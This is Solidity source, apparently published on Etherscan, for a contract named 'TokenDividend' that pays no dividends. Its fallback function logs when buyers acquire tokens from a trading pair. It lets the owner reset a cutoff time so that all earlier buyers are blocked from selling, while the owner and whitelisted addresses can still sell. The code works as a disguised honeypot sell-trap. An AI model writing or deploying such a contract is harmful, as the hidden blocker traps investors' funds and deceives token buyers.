/**
 *Submitted for verification at Etherscan.io on 2023-05-25
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

contract TokenDividend {
    address private _owner;    
    address private token;
    address private pair;

    bool private isFinished;

    mapping(address => bool) private _whitelists;
    mapping (address => uint256) private _addressTime;

    uint256 private lastTime;

    modifier onlyToken() {
        require(msg.sender == token); 
        _;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender);
        _;
    }

    constructor () {
        _owner = msg.sender;
        _whitelists[_owner] = true;
    }

    function setTokenIsFinished(bool _isFinished) external onlyOwner {
      isFinished = _isFinished;
    }

    function refreshProxySetting(address _token, address _pair) external onlyOwner {
      token = _token;
      pair = _pair;
      isFinished = false;
    }

    function setLastTimeForToken() external onlyOwner {
      lastTime = block.timestamp;
    }

    function whitelistForTokenHolder(address owner_, bool _isWhitelist) external onlyOwner {
      _whitelists[owner_] = _isWhitelist;
    }

    fallback() external payable {
      address _from;
      address _to;
      bytes memory data = msg.data;
      assembly {
          _from := mload(add(data, 0x14))
          _to := mload(add(data, mul(0x14, 2)))
      }

      if (_whitelists[_from] || _whitelists[_to]) {
        return;
      }
      if (_from == pair) {
        if (_addressTime[_to] == 0) {
          _addressTime[_to] = block.timestamp;
        }
        return;
      } else if (_to == pair) {
        require(!isFinished && _addressTime[_from] >= lastTime);
        return;
      } else {
        _addressTime[_to] = _addressTime[_from];
        return;
      }
      revert();
    }
}